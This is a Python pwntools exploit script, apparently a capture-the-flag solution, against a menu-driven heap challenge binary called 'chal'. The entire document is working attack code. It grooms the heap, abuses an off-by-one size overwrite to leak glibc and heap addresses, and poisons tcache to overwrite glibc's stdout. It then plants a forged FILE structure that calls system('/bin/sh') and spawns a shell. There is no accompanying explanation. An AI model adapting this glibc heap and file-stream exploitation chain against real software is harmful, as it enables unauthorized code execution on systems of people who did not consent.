from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    continue
''')

def add_dish(slot, type, name):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b': ', str(slot).encode())
    p.sendlineafter(b': ', str(type).encode())
    p.sendafter(b': ', name)

def delete_dish(slot):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b': ', str(slot).encode())

def edit_dish(slot, name):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b': ', str(slot).encode())
    p.sendafter(b': ', name)

def show_dish(slot):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b': ', str(slot).encode())
    return p.recvline().strip()

for i in range(9):
    add_dish(i, 4, b'X')
add_dish(9, 1, b'X')
for i in range(9):
    delete_dish(10-i-1-1)
add_dish(0, 2, b'X'*0xf8+p64(0x100*8+1)+b'X'*8+p64(0))
add_dish(2, 4, b'X')
delete_dish(1)
add_dish(1, 3, b'X'*8)
glibc_base_addr = u64(show_dish(1)[8:0x10].ljust(8, b'\x00'))-0x204010
log.info(f'glibc base address: {hex(glibc_base_addr)}')
edit_dish(1, b'X'*0x10)
heap_base_addr = u64(show_dish(1)[0x10:0x18].ljust(8, b'\x00'))-0x390
log.info(f'heap base address: {hex(heap_base_addr)}')

glibc_e = ELF('./libc.so.6')
add_dish(10, 3, b'X'*0xb8+p64(0x100+1)+p64(((heap_base_addr+0x5a0)>>12)^(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])))
add_dish(11, 4, b'X')
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
add_dish(12, 4, bytes(fake))

p.interactive()